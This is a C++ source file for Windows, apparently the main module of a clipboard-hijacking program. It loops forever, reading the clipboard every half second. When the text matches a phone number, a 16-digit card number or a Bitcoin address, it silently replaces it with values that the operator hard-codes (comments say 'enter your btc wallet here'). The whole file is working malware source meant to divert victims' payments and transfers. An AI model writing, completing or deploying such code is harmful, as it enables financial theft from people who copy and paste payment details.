#include "Clipboard.h"

inline void init_userData(std::shared_ptr<User_data> userData) {
  userData->user_data.insert
  (std::make_pair("user_phone_number", "89811482959"));  // enter your phone here

  userData->user_data.insert
  (std::make_pair("user_card_number", "1234123412341234"));     //enter your credit card here

  userData->user_data.insert
  (std::make_pair("user_bitcoin_wallet", "1Ct3624zikMLgSo7v8nqDfwY374hsKnaJT"));   //enter your btc wallet here
}

int main(int argc, char* argv[]) {
  SetConsoleCP(1251);
  SetConsoleOutputCP(1251);

  std::shared_ptr<User_data> userData = std::make_shared<User_data>();
  init_userData(userData);

  HGLOBAL hgBuffer = nullptr;
  char* chBuffer = nullptr;

  std::shared_ptr<ClipboardPhoneNumber> phoneNumber =
      std::make_shared<ClipboardPhoneNumber>();
  std::shared_ptr<ClipboardCardNumber> cardNumber =
      std::make_shared<ClipboardCardNumber>();
  std::shared_ptr<ClipboardBitcoin> btcWallet =
      std::make_shared<ClipboardBitcoin>();

  while (true) {
    auto tmp = GetClipboardText();
    std::string text(tmp.begin(), tmp.end());

    if (std::regex_search(text, *phoneNumber->getRegex()) &&
        (text.length() == 10 || text.length() == 11 || text.length() == 12)) {
      SetToClipboard(userData->user_data["user_phone_number"], hgBuffer,
                     chBuffer);
    } else if (std::regex_search(text, *cardNumber->getRegex()) &&
               text.length() == 16) {
      SetToClipboard(userData->user_data["user_card_number"], hgBuffer,
                     chBuffer);
    } else if (std::regex_search(text, *btcWallet->getRegex()) &&
        (text.length() >= 25 && text.length() < 35)) {
      SetToClipboard(userData->user_data["user_bitcoin_wallet"], hgBuffer,
                     chBuffer);
    }

    std::cout << text << std::endl;
    Sleep(500);
  }
}